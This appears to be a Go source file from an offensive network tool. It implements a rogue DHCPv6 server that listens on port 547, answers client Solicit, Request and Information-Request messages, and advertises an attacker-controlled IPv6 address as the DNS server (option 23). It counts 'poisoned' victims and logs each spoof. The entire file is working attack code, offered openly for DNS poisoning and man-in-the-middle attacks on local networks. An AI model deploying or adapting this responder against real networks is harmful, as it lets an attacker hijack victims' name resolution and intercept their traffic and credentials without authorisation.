// Package dhcp6 implements a rogue DHCPv6 server that hands victims a DNS
// server controlled by the attacker (option 23), enabling DNS poisoning for
// clients that prefer DHCPv6-provided DNS over RDNSS.
package dhcp6

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/qyvora/toha3ee/internal/events"
)

// DHCPv6 message types.
const (
	msgSolicit   = 1
	msgAdvertise = 2
	msgRequest   = 3
	msgReply     = 7
	msgInfoReq   = 11
)

// Option codes.
const (
	optClientID   = 1
	optServerID   = 2
	optIANA       = 3
	optORO        = 6
	optDNS        = 23
	optDomainList = 24
)

// Responder answers DHCPv6 Solicit/Request/Information-Request with a server
// that advertises attackerIP as the recursive DNS server.
type Responder struct {
	iface      *net.Interface
	attackerIP net.IP
	bus        *events.Bus

	conn     *net.UDPConn
	stop     chan struct{}
	wg       sync.WaitGroup
	stopOnce sync.Once

	Queries  atomic.Int64
	Poisoned atomic.Int64
}

// New returns an idle responder. attackerIP must be a valid IPv6 address.
func New(iface *net.Interface, attackerIP net.IP, bus *events.Bus) *Responder {
	return &Responder{iface: iface, attackerIP: attackerIP.To16(), bus: bus, stop: make(chan struct{})}
}

// Start binds UDP6 :547 and joins the DHCPv6 all-servers multicast group.
func (r *Responder) Start() error {
	if r.attackerIP == nil {
		return fmt.Errorf("dhcp6: no attacker IPv6 configured")
	}
	conn, err := net.ListenUDP("udp6", &net.UDPAddr{IP: net.IPv6unspecified, Port: 547})
	if err != nil {
		return fmt.Errorf("dhcp6 bind [::]:547: %w", err)
	}
	group := net.ParseIP("ff02::1:2")
	if err := joinGroup(conn, r.iface, group); err != nil {
		_ = conn.Close()
		return fmt.Errorf("dhcp6 join multicast: %w", err)
	}
	r.conn = conn
	r.wg.Add(1)
	go r.loop()
	return nil
}

// Stop closes the socket and waits for the read loop to exit.
func (r *Responder) Stop() {
	r.stopOnce.Do(func() {
		close(r.stop)
		if r.conn != nil {
			_ = r.conn.Close()
		}
	})
	r.wg.Wait()
}

func (r *Responder) loop() {
	defer r.wg.Done()
	buf := make([]byte, 4096)
	for {
		select {
		case <-r.stop:
			return
		default:
		}
		_ = r.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, src, err := r.conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		if reply := r.handle(buf[:n]); reply != nil {
			dst := &net.UDPAddr{IP: src.IP, Port: 546}
			if _, err := r.conn.WriteToUDP(reply, dst); err == nil {
				r.Poisoned.Add(1)
			}
		}
	}
}

// handle parses a DHCPv6 client message and builds the matching response.
func (r *Responder) handle(pkt []byte) []byte {
	if len(pkt) < 4 {
		return nil
	}
	msgType := pkt[0]
	txid := pkt[1:4]
	options := parseOptions(pkt[4:])

	r.Queries.Add(1)
	var clientID, serverID []byte
	var iaids [][]byte
	for _, o := range options {
		switch o.code {
		case optClientID:
			clientID = o.data
		case optServerID:
			serverID = o.data
		case optIANA:
			if len(o.data) >= 4 {
				iaids = append(iaids, o.data[:4])
			}
		}
	}

	var respType byte
	switch msgType {
	case msgSolicit:
		respType = msgAdvertise
	case msgRequest, msgInfoReq:
		respType = msgReply
	default:
		return nil
	}
	_ = serverID

	msg := append([]byte{respType}, txid...)
	msg = appendOption(msg, optServerID, serverID)
	if clientID != nil {
		msg = appendOption(msg, optClientID, clientID)
	}
	// DNS recursive name servers (option 23) -> attacker.
	msg = appendOption(msg, optDNS, r.attackerIP)
	for _, iaid := range iaids {
		// Echo the IA_NA (option 3) with the client's IAID, no lease.
		iana := append([]byte{}, iaid...)
		iana = append(iana, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) // T1=0, T2=0
		msg = appendOption(msg, optIANA, iana)
	}

	if r.bus != nil {
		r.bus.Emit(events.TopicLog,
			fmt.Sprintf("dhcp6.spoof: %s %s -> DNS %s", srcName(msgType), fmt.Sprint(iaids), r.attackerIP))
	}
	return msg
}

func srcName(t byte) string {
	switch t {
	case msgSolicit:
		return "solicit"
	case msgRequest:
		return "request"
	case msgInfoReq:
		return "info-req"
	}
	return "query"
}

type option struct {
	code uint16
	data []byte
}

func parseOptions(b []byte) []option {
	var out []option
	for len(b) >= 4 {
		code := binary.BigEndian.Uint16(b[:2])
		length := int(binary.BigEndian.Uint16(b[2:4]))
		if length > len(b)-4 {
			return out
		}
		out = append(out, option{code: code, data: b[4 : 4+length]})
		b = b[4+length:]
	}
	return out
}

func appendOption(msg []byte, code uint16, data []byte) []byte {
	var hdr [4]byte
	binary.BigEndian.PutUint16(hdr[:2], code)
	binary.BigEndian.PutUint16(hdr[2:], uint16(len(data)))
	msg = append(msg, hdr[:]...)
	return append(msg, data...)
}
